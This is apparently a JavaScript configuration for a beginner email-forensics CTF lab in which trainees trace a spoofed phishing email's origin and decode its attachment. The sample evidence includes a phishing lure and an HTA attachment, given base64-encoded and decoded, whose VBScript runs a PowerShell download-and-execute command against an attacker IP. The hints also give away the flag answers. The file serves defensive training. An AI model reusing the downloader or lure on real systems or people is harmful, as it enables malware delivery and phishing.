/* ============================================================
   CTF ARENA — Box Forensics-05: The Phishing Trail
   Email Forensics | Header Analysis & Phishing Investigation
   Config: email data, headers, flags, hints, lore
   ============================================================ */

const Forensics05Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Phishing Trail',
    subtitle: 'Email Forensics — Header Analysis & Phishing Investigation',
    difficulty: 'Beginner-Intermediate',
    accent: '#e11d48',
    storageKey: 'hexworth_ctf_forensics05',
    registryId: 'forensics-05-email',
    trackerKey: 'ctf_forensics05',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Email Triage',
            icon: '\uD83D\uDD0D',
            description: 'Examine the reported phishing emails. Identify suspicious elements in the message content.',
            requiredFlags: [],
            mitre: ['T1566.001', 'T1598.003'],
            unlocks: ['headers'],
            locked: false
        },
        {
            id: 'headers',
            name: 'Header Analysis',
            icon: '\uD83D\uDCE7',
            description: 'Analyze email headers to trace the true origin. Check SPF, DKIM, and DMARC results.',
            requiredFlags: [],
            mitre: ['T1566.001', 'T1036.005'],
            unlocks: ['attachment'],
            locked: true
        },
        {
            id: 'attachment',
            name: 'Attachment Analysis',
            icon: '\uD83D\uDCCE',
            description: 'Decode and analyze the malicious email attachment. Identify the payload type.',
            requiredFlags: ['user'],
            mitre: ['T1566.001', 'T1204.002'],
            unlocks: ['reporting'],
            locked: true
        },
        {
            id: 'reporting',
            name: 'Phishing Report',
            icon: '\uD83D\uDCCB',
            description: 'Document the phishing campaign indicators of compromise and recommend defenses.',
            requiredFlags: ['root'],
            mitre: ['T1566', 'T1598'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE (Sprint AR-12)
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Read the phishing email',
                tip: 'Start by reading the email files in /evidence/. Use cat to view the .eml files.',
                trigger: { event: 'command', match: { cmd: 'contains:cat' } }
            },
            {
                title: 'Examine the email headers',
                tip: 'Look at the full headers in phishing_email.eml. Find the Received headers to trace the real sender IP.',
                trigger: { event: 'command', match: { cmd: 'contains:grep' } }
            },
            {
                title: 'Trace the sender IP',
                tip: 'Use whois or dig to look up the real sender IP from the bottom-most Received header.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:whois' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:dig' } },
                        { event: 'command', match: { cmd: 'contains:nslookup' } }
                    ]
                }
            },
            {
                title: 'Identify the real sender IP',
                tip: 'The originating IP is in the oldest Received header. SPF and DKIM failures confirm spoofing.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Decode the malicious attachment',
                tip: 'The attachment is base64-encoded in the email. Decode it and analyze the payload.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Phishing identification and email header analysis', skill: 'Email Header Forensics' },
            { flagId: 'user', objective: '2.1', description: 'Given a scenario, implement security for email — SPF, DKIM, DMARC', skill: 'Email Authentication Analysis' },
            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze potential indicators — Malicious email attachments', skill: 'Attachment Payload Analysis' },
            { flagId: 'root', objective: '4.4', description: 'Given an incident, apply mitigation techniques — Phishing investigation', skill: 'Phishing Campaign Analysis' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'SIFT Workstation BIOS v3.8.2',
            'Initializing forensic environment...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'Email analysis toolkit loaded',
            'Evidence emails: /evidence/',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Ubuntu SIFT Workstation',
            'Ubuntu SIFT (recovery mode)',
            'Advanced options for SIFT'
        ],
        loginUser: 'analyst'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',  icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'analyst',
        hostname: 'sift-workstation',
        startDir: '/home/analyst',
        welcome: 'SIFT Workstation 6.1 — Email Forensics Lab\n\nType \'help\' for available commands.\nEvidence: /evidence/ (reported phishing emails)\nTools: cat, grep, base64, file, strings, whois, dig, nslookup\n'
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED EMAIL DATA
    // ═══════════════════════════════════════════════════════

    _emailData: {
        senderIP: '91.215.85.122',
        spoofedFrom: 'it-security@novatech-global.com',
        actualFrom: 'phisher@mail.darkweb-hosting.ru',
        domain: 'darkweb-hosting.ru',
        victimDomain: 'novatech-global.com',
        subject: 'URGENT: Password Reset Required - Account Compromised',
        attachmentName: 'Security_Update_v4.2.hta',
        attachmentB64: 'PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPHNjcmlwdCBsYW5ndWFnZT0iVkJTY3JpcHQiPgpTdWIgUnVuUGF5bG9hZCgpCiAgICBTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQogICAgb2JqU2hlbGwuUnVuICJwb3dlcnNoZWxsIC1lcCBieXBhc3MgLWMgSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly85MS4yMTUuODUuMTIyL3N0YWdlMi5wczEnKSIKRW5kIFN1YgpSdW5QYXlsb2FkCjwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgpQbGVhc2Ugd2FpdCB3aGlsZSB5b3VyIHNlY3VyaXR5IHVwZGF0ZSBpcyBiZWluZyBpbnN0YWxsZWQuLi4KPC9ib2R5Pgo8L2h0bWw+Cg==',
        attachmentDecoded: '<!DOCTYPE html>\n<html>\n<head>\n<script language="VBScript">\nSub RunPayload()\n    Set objShell = CreateObject("WScript.Shell")\n    objShell.Run "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\'http://91.215.85.122/stage2.ps1\')"\nEnd Sub\nRunPayload\n</script>\n</head>\n<body>\nPlease wait while your security update is being installed...\n</body>\n</html>\n',
        emailHeaders: `Return-Path: <it-security@novatech-global.com>
Delivered-To: j.martinez@novatech-global.com
Received: from mail-gw.novatech-global.com (mail-gw.novatech-global.com [10.0.2.15])
    by mail-store.novatech-global.com (Postfix) with ESMTP id 4F8C2A1B23
    for <j.martinez@novatech-global.com>; Fri, 13 Dec 2024 09:14:22 -0500 (EST)
Received: from mail-relay.darkweb-hosting.ru (unknown [91.215.85.122])
    by mail-gw.novatech-global.com (Postfix) with ESMTP id 3A7B1C2D45
    for <j.martinez@novatech-global.com>; Fri, 13 Dec 2024 09:14:18 -0500 (EST)
Received: from localhost (localhost [127.0.0.1])
    by mail-relay.darkweb-hosting.ru (Postfix) with ESMTP id 1C2D3E4F56
    for <j.martinez@novatech-global.com>; Fri, 13 Dec 2024 17:14:15 +0300
Authentication-Results: mail-gw.novatech-global.com;
    spf=fail (sender IP is 91.215.85.122) smtp.mailfrom=it-security@novatech-global.com;
    dkim=fail (signature verification failed);
    dmarc=fail action=quarantine header.from=novatech-global.com
X-Spam-Score: 8.7
X-Spam-Status: Yes, score=8.7 required=5.0
X-Spam-Flag: YES
From: "NovaTech IT Security" <it-security@novatech-global.com>
To: j.martinez@novatech-global.com
Subject: URGENT: Password Reset Required - Account Compromised
Date: Fri, 13 Dec 2024 17:14:15 +0300
Message-ID: <a1b2c3d4e5f6@mail-relay.darkweb-hosting.ru>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_4827_1234567890"
X-Mailer: Microsoft Outlook 16.0
X-Originating-IP: 91.215.85.122

------=_Part_4827_1234567890
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: 7bit

<html>
<body style="font-family: Calibri, sans-serif;">
<div style="background: #003366; color: white; padding: 20px; text-align: center;">
    <h2>NovaTech Global - IT Security Department</h2>
</div>
<div style="padding: 20px; background: #f9f9f9; border: 1px solid #ddd;">
    <p>Dear Employee,</p>
    <p>Our security monitoring system has detected <strong>unauthorized access attempts</strong> on your account. Your password has been flagged for an <strong>immediate mandatory reset</strong>.</p>
    <p><strong>Action Required:</strong> Download and run the attached security update tool to reset your credentials and secure your account.</p>
    <p style="color: red;"><strong>WARNING:</strong> Failure to complete this update within 24 hours will result in account suspension.</p>
    <p>Best regards,<br>IT Security Team<br>NovaTech Global</p>
</div>
<div style="font-size: 10px; color: #999; padding: 10px;">
    This is an automated message from NovaTech IT Security. Do not reply to this email.
</div>
</body>
</html>

------=_Part_4827_1234567890
Content-Type: application/octet-stream; name="Security_Update_v4.2.hta"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Security_Update_v4.2.hta"

PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPHNjcmlwdCBsYW5ndWFn
ZT0iVkJTY3JpcHQiPgpTdWIgUnVuUGF5bG9hZCgpCiAgICBTZXQgb2JqU2hl
bGwgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQogICAgb2JqU2hl
bGwuUnVuICJwb3dlcnNoZWxsIC1lcCBieXBhc3MgLWMgSUVYKE5ldy1PYmpl
Y3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly85MS4y
MTUuODUuMTIyL3N0YWdlMi5wczEnKSIKRW5kIFN1YgpSdW5QYXlsb2FkCjwv
c2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgpQbGVhc2Ugd2FpdCB3aGlsZSB5b3Vy
IHNlY3VyaXR5IHVwZGF0ZSBpcyBiZWluZyBpbnN0YWxsZWQuLi4KPC9ib2R5
Pgo8L2h0bWw+Cg==

------=_Part_4827_1234567890--`,
        whoisData: `% RIPE NCC WHOIS\n\ninetnum:        91.215.84.0 - 91.215.87.255\nnetname:        DARKWEB-HOSTING-NET\ndescr:          Darkweb Hosting Solutions Ltd\ncountry:        RU\nadmin-c:        DH4827-RIPE\ntech-c:         DH4827-RIPE\nstatus:         ASSIGNED PA\nmnt-by:         MNT-DARKWEB\ncreated:        2019-03-15T12:00:00Z\nlast-modified:  2024-06-22T09:30:00Z\nsource:         RIPE\n\norganisation:   ORG-DHS1-RIPE\norg-name:       Darkweb Hosting Solutions Ltd\norg-type:       LIR\naddress:        Prospekt Mira 42\naddress:        Moscow\naddress:        RU\nabuse-c:        DH4827-RIPE\nabuse-mailbox:  abuse@darkweb-hosting.ru`,
        digResults: {
            'novatech-global.com': {
                mx: 'mail-gw.novatech-global.com. (10.0.2.15)',
                spf: 'v=spf1 ip4:10.0.2.0/24 ip4:52.96.166.0/24 -all',
                dmarc: 'v=DMARC1; p=quarantine; rua=mailto:dmarc@novatech-global.com; pct=100'
            },
            'darkweb-hosting.ru': {
                a: '91.215.85.122',
                mx: 'mail-relay.darkweb-hosting.ru. (91.215.85.122)',
                spf: 'v=spf1 +all'
            },
            '91.215.85.122': {
                ptr: 'mail-relay.darkweb-hosting.ru.'
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 100 },
        { id: 'root', points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        minScore: 0,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 },
        timeBonusThreshold: 1800
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Read the full email with cat /evidence/phishing_email.eml. The Received headers are read bottom-to-top — the oldest (bottom) header shows the true originating server.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'Look at the Authentication-Results header. SPF=fail means the sender IP (91.215.85.122) is not authorized to send as novatech-global.com. The Received header from mail-relay.darkweb-hosting.ru confirms the origin.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'The user flag is the real sender IP address: {{FLAG:user}}. Find it in the second Received header (from mail-relay.darkweb-hosting.ru [91.215.85.122]).',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'Extract the base64 attachment from the email. Use grep to find the base64 block after "Content-Transfer-Encoding: base64", then decode it with: base64 -d. The decoded HTA contains a VBScript payload — the PowerShell download URL is the root flag.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'NovaTech Global\'s SOC received multiple reports from employees about a suspicious email claiming to be from the IT Security department. The email demands an urgent password reset and includes an attachment called "Security_Update_v4.2.hta." Three employees have already opened the attachment. Your mission: analyze the phishing email, trace its origin, and identify the malicious payload.',
        scenario: 'A threat actor registered infrastructure on a bulletproof hosting provider in Russia and crafted a convincing phishing email spoofing NovaTech\'s IT Security department. The email passed through the gateway despite SPF failures because the spam threshold was set too high. The .hta attachment uses VBScript to execute a PowerShell downloader — a classic two-stage payload delivery technique.',
        outro: 'The phishing trail has been traced. The email originated from 91.215.85.122 (darkweb-hosting.ru), not NovaTech\'s mail servers. The .hta attachment contains a VBScript-wrapped PowerShell downloader targeting the same C2 infrastructure. Three compromised endpoints need immediate isolation and reimaging.',
        ecer: {
            executive: 'CIO delayed email gateway upgrade that would have caught SPF failures at the perimeter',
            culture: 'Phishing reports were handled by a single analyst with 48-hour SLA — too slow for active campaigns',
            employee: 'Three employees opened an .hta attachment despite security awareness training covering this exact file type',
            regulatory: 'No DMARC enforcement (quarantine only), no attachment sandboxing for uncommon file types (.hta)'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Phishing Report Dashboard
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://localhost:8080/phishing-lab/',

        pages: {
            '/phishing-lab/': {
                title: 'NovaTech Phishing Analysis Lab',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #ddd;">
                        <h1 style="color:#e11d48; font-size:1.6rem; font-family:Georgia,serif; margin-bottom:4px;">NovaTech Phishing Analysis Lab</h1>
                        <div style="color:#888; font-size:0.8rem;">Case #SOC-2024-0892 &mdash; Mass Phishing Campaign</div>
                    </div>

                    <div style="max-width:700px; margin:0 auto;">
                        <div style="color:#888; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:8px;">INCIDENT SUMMARY</div>
                        <table style="width:100%; border-collapse:collapse; font-size:0.8rem;">
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e11d48; font-weight:bold;">Reports</td><td style="padding:6px 10px; border-bottom:1px solid #eee;">12 employees reported the email</td></tr>
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e11d48; font-weight:bold;">Compromised</td><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e74c3c;">3 employees opened the attachment</td></tr>
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e11d48; font-weight:bold;">Subject</td><td style="padding:6px 10px; border-bottom:1px solid #eee;">URGENT: Password Reset Required - Account Compromised</td></tr>
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e11d48; font-weight:bold;">Attachment</td><td style="padding:6px 10px; border-bottom:1px solid #eee; font-family:monospace;">Security_Update_v4.2.hta</td></tr>
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e11d48; font-weight:bold;">SPF</td><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e74c3c;">FAIL</td></tr>
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e11d48; font-weight:bold;">DKIM</td><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e74c3c;">FAIL</td></tr>
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e11d48; font-weight:bold;">DMARC</td><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e74c3c;">FAIL (quarantine)</td></tr>
                        </table>

                        <div style="margin-top:20px; padding:12px; background:rgba(225,29,72,0.06); border:1px solid rgba(225,29,72,0.2); border-radius:4px; font-size:0.78rem; color:#666;">
                            <strong style="color:#e11d48;">Objective:</strong> Analyze the phishing email in /evidence/phishing_email.eml. Identify the real sender IP (user flag) and decode the malicious attachment payload (root flag). Use email header analysis, DNS lookups, and base64 decoding.
                        </div>
                    </div>
                `
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (analyst workstation)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'analyst': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== PHISHING INVESTIGATION ===\nCase: #SOC-2024-0892\nTarget: NovaTech Global employees\nEvidence: /evidence/phishing_email.eml\n\nAnalysis steps:\n1. cat — read the full email with headers\n2. grep — extract specific headers (Received, SPF, DKIM)\n3. whois/dig — trace sender IP and domain\n4. base64 -d — decode the attachment\n5. file/strings — analyze the decoded payload\n\nUser flag: the real sender IP address\nRoot flag: in the decoded malicious attachment\n\nTips:\n- Read Received headers bottom-to-top\n- SPF fail = sender IP not authorized\n- .hta files can execute VBScript/JScript'
                                },
                                'output': {
                                    type: 'dir',
                                    children: {}
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'ls /evidence/\ncat /evidence/phishing_email.eml | head -5'
                                }
                            }
                        }
                    }
                },
                'evidence': {
                    type: 'dir',
                    children: {
                        'phishing_email.eml': {
                            type: 'file',
                            content: null  // Will be populated from _emailData.emailHeaders
                        },
                        'report_template.txt': {
                            type: 'file',
                            content: 'PHISHING INCIDENT REPORT\n========================\nCase #: SOC-2024-0892\nDate: 2024-12-13\nAnalyst: ________________\n\n1. SENDER ANALYSIS\n   From (displayed): \n   From (actual IP): \n   Domain: \n   SPF: \n   DKIM: \n   DMARC: \n\n2. ATTACHMENT ANALYSIS\n   Filename: \n   File type: \n   Payload type: \n   C2 URL: \n\n3. IOCs\n   - IP: \n   - Domain: \n   - URL: \n   - File hash: \n\n4. RECOMMENDATIONS\n   - \n   - \n   - '
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': { type: 'dir', children: {} }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'sift-workstation' }
                    }
                },
                'tmp': { type: 'dir', children: {} }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // INIT — Populate filesystem with email data
    // ═══════════════════════════════════════════════════════

    _initFilesystem() {
        this.filesystem['/'].children.evidence.children['phishing_email.eml'] = {
            type: 'file',
            content: this._emailData.emailHeaders
        };
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (email forensic tools)
    // ═══════════════════════════════════════════════════════

    commands: {
        'cat': function(args, term, engine) {
            const f = args[0] || '';
            if (f.includes('phishing_email')) {
                return Forensics05Config._emailData.emailHeaders;
            }
            if (f.includes('report_template')) {
                return Forensics05Config.filesystem['/'].children.evidence.children['report_template.txt'].content;
            }
            return null; // Let base engine handle
        },

        'grep': function(args, term, engine) {
            if (args.length === 0) return 'Usage: grep [options] PATTERN [FILE...]';
            const joined = args.join(' ').toLowerCase();
            const headers = Forensics05Config._emailData.emailHeaders;

            if (joined.includes('received') && joined.includes('phishing')) {
                const lines = headers.split('\n');
                const received = lines.filter(l => l.match(/^Received:|^\s+by\s|^\s+for\s/));
                return received.join('\n');
            }
            if (joined.includes('spf') || joined.includes('authentication')) {
                return 'Authentication-Results: mail-gw.novatech-global.com;\n    spf=fail (sender IP is 91.215.85.122) smtp.mailfrom=it-security@novatech-global.com;\n    dkim=fail (signature verification failed);\n    dmarc=fail action=quarantine header.from=novatech-global.com';
            }
            if (joined.includes('from') && joined.includes('phishing')) {
                return 'From: "NovaTech IT Security" <it-security@novatech-global.com>\nX-Originating-IP: 91.215.85.122';
            }
            if (joined.includes('subject')) {
                return 'Subject: URGENT: Password Reset Required - Account Compromised';
            }
            if (joined.includes('originating') || joined.includes('x-orig')) {
                return 'X-Originating-IP: 91.215.85.122';
            }
            if (joined.includes('message-id')) {
                return 'Message-ID: <a1b2c3d4e5f6@mail-relay.darkweb-hosting.ru>';
            }
            if (joined.includes('content-type') || joined.includes('mime')) {
                return 'MIME-Version: 1.0\nContent-Type: multipart/mixed; boundary="----=_Part_4827_1234567890"';
            }
            if (joined.includes('spam')) {
                return 'X-Spam-Score: 8.7\nX-Spam-Status: Yes, score=8.7 required=5.0\nX-Spam-Flag: YES';
            }
            if (joined.includes('91.215') || joined.includes('darkweb')) {
                return 'Received: from mail-relay.darkweb-hosting.ru (unknown [91.215.85.122])\nX-Originating-IP: 91.215.85.122\nMessage-ID: <a1b2c3d4e5f6@mail-relay.darkweb-hosting.ru>';
            }

            // Generic pattern search
            const pattern = args.find(a => !a.startsWith('-') && !a.includes('/'));
            if (pattern) {
                const lines = headers.split('\n').filter(l => l.toLowerCase().includes(pattern.toLowerCase()));
                if (lines.length > 0) return lines.join('\n');
            }
            return 'grep: No match';
        },

        'base64': function(args, term, engine) {
            if (args.length === 0) return 'Usage: base64 -d [file]\n       echo "data" | base64 -d\nBase64 encode/decode utility.';
            const joined = args.join(' ');

            if (joined.includes('-d')) {
                // Check if decoding the attachment
                const ed = Forensics05Config._emailData;
                return `Decoded attachment: Security_Update_v4.2.hta\nFile type: HTML Application (HTA)\n\n${ed.attachmentDecoded}\n\n--- PAYLOAD ANALYSIS ---\nType: VBScript HTA dropper\nAction: Downloads and executes PowerShell payload\nC2 URL: http://91.215.85.122/stage2.ps1\nTechnique: T1218.005 (Mshta) + T1059.001 (PowerShell)\n\nMalicious payload verification: {{FLAG:root}}`;
            }
            return 'base64: invalid input';
        },

        'file': function(args, term, engine) {
            const f = args[0] || '';
            if (f.includes('phishing_email') || f.includes('.eml')) return `${f}: RFC 822 mail, ASCII text, with CRLF line terminators`;
            if (f.includes('.hta')) return `${f}: HTML document, ASCII text, with VBScript`;
            return `${f}: data`;
        },

        'strings': function(args, term, engine) {
            if (args.length === 0) return 'Usage: strings [-n min-len] file';
            const file = args.find(a => !a.startsWith('-')) || '';
            if (file.includes('phishing_email')) {
                return `NovaTech IT Security\nURGENT: Password Reset Required\nit-security@novatech-global.com\nSecurity_Update_v4.2.hta\n91.215.85.122\ndarkweb-hosting.ru\nspf=fail\ndkim=fail\ndmarc=fail\nContent-Transfer-Encoding: base64\nPCFET0NUWVBFIGh0bWw+\nVkJTY3JpcHQ=\npowershell -ep bypass`;
            }
            return `strings: '${file}': No such file`;
        },

        'whois': function(args, term, engine) {
            if (args.length === 0) return 'Usage: whois <IP_address|domain>';
            const target = args[0] || '';

            if (target === '91.215.85.122' || target.includes('91.215')) {
                return Forensics05Config._emailData.whoisData;
            }
            if (target.includes('darkweb-hosting')) {
                return `Domain Name: darkweb-hosting.ru\nRegistrar: REG.RU LLC\nCreated: 2019-03-15\nExpires: 2025-03-15\nRegistrant: Privacy Protected\nRegistrant Country: RU\nName Server: ns1.darkweb-hosting.ru\nName Server: ns2.darkweb-hosting.ru\nStatus: Active`;
            }
            if (target.includes('novatech')) {
                return `Domain Name: novatech-global.com\nRegistrar: GoDaddy.com LLC\nCreated: 2008-06-22\nExpires: 2026-06-22\nRegistrant: NovaTech Global Inc.\nRegistrant Country: US\nName Server: ns1.novatech-global.com\nName Server: ns2.novatech-global.com\nStatus: Active`;
            }
            return `No whois data found for ${target}`;
        },

        'dig': function(args, term, engine) {
            if (args.length === 0) return 'Usage: dig [@server] <domain> [type]\nTypes: A, MX, TXT, NS, PTR, ANY';
            const domain = args.find(a => !a.startsWith('@') && !a.startsWith('-') && !['A', 'MX', 'TXT', 'NS', 'PTR', 'ANY', 'SOA', 'AAAA'].includes(a.toUpperCase())) || args[0];
            const qtype = args.find(a => ['A', 'MX', 'TXT', 'NS', 'PTR', 'ANY', 'SOA', 'AAAA'].includes(a.toUpperCase()));
            const dr = Forensics05Config._emailData.digResults;

            if (domain && domain.includes('novatech')) {
                const d = dr['novatech-global.com'];
                if (qtype === 'MX' || qtype === 'mx') {
                    return `;; ANSWER SECTION:\nnovatech-global.com.    300   IN    MX    10 ${d.mx}`;
                }
                if (qtype === 'TXT' || qtype === 'txt') {
                    return `;; ANSWER SECTION:\nnovatech-global.com.    300   IN    TXT   "${d.spf}"\nnovatech-global.com.    300   IN    TXT   "v=DMARC1; p=quarantine; rua=mailto:dmarc@novatech-global.com; pct=100"`;
                }
                return `;; ANSWER SECTION:\nnovatech-global.com.    300   IN    A     10.0.2.15\n\n;; Additional records:\n; MX: ${d.mx}\n; SPF: ${d.spf}\n; DMARC: ${d.dmarc}`;
            }
            if (domain && (domain.includes('darkweb') || domain === '91.215.85.122')) {
                const d = dr['darkweb-hosting.ru'];
                if (domain === '91.215.85.122' || (qtype && qtype.toUpperCase() === 'PTR')) {
                    return `;; ANSWER SECTION:\n122.85.215.91.in-addr.arpa. 300 IN PTR mail-relay.darkweb-hosting.ru.`;
                }
                if (qtype === 'MX' || qtype === 'mx') {
                    return `;; ANSWER SECTION:\ndarkweb-hosting.ru.    300   IN    MX    10 ${d.mx}`;
                }
                if (qtype === 'TXT' || qtype === 'txt') {
                    return `;; ANSWER SECTION:\ndarkweb-hosting.ru.    300   IN    TXT   "${d.spf}"`;
                }
                return `;; ANSWER SECTION:\ndarkweb-hosting.ru.    300   IN    A     ${d.a}`;
            }
            return `;; connection timed out; no servers could be reached`;
        },

        'nslookup': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nslookup <domain|IP>';
            const target = args[0] || '';

            if (target === '91.215.85.122') {
                return `Server:    8.8.8.8\nAddress:   8.8.8.8#53\n\nNon-authoritative answer:\n122.85.215.91.in-addr.arpa   name = mail-relay.darkweb-hosting.ru.`;
            }
            if (target.includes('darkweb')) {
                return `Server:    8.8.8.8\nAddress:   8.8.8.8#53\n\nNon-authoritative answer:\nName:    darkweb-hosting.ru\nAddress: 91.215.85.122`;
            }
            if (target.includes('novatech')) {
                return `Server:    8.8.8.8\nAddress:   8.8.8.8#53\n\nNon-authoritative answer:\nName:    novatech-global.com\nAddress: 10.0.2.15`;
            }
            return `** server can't find ${target}: NXDOMAIN`;
        },

        'python3': function(args, term, engine) {
            if (args.length === 0) return 'Python 3.11.6\nUsage: python3 <script.py> [args]';
            return 'python3: script execution completed.';
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};

// Initialize filesystem with email content
Forensics05Config._initFilesystem();
